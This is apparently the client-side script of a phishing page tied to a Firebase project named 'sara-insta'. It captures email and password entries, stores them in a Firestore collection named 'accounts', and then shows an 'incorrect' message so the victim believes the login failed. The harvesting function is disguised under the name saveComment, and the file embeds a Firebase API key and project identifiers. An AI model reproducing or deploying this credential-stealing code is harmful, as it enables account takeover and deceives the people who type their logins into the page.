// Import Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-firestore.js";

// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCBDn5GDDe_KoOaoMInjdSew2ZMmiQ4fKs",
    authDomain: "sara-insta.firebaseapp.com",
    projectId: "sara-insta",
    storageBucket: "sara-insta.firebasestorage.app",
    messagingSenderId: "1018759929243",
    appId: "1:1018759929243:web:0b70baa32683117ea4d53e"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Function to save comment
async function saveComment() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    if (email === "" || password === "") {
        // alert("Please fill out both fields.");
        fill.style.display="inline"
        return;
    }

    try {
        await addDoc(collection(db, "accounts"), {
          email: email,
          password: password,
            timestamp: new Date()
        });
        // alert("Comment saved!");
        // document.getElementById("email").value = "";
        // document.getElementById("password").value = "";
        incorrect.style.display="inline"
        console.log("done");
    } catch (error) {
        console.error("Error adding document: ", error);
    }
}
let fill = document.getElementById("fill");
let incorrect = document.getElementById("incorrect");
// Add event listener to the submit button
document.getElementById("submitBtn").addEventListener("click", saveComment);
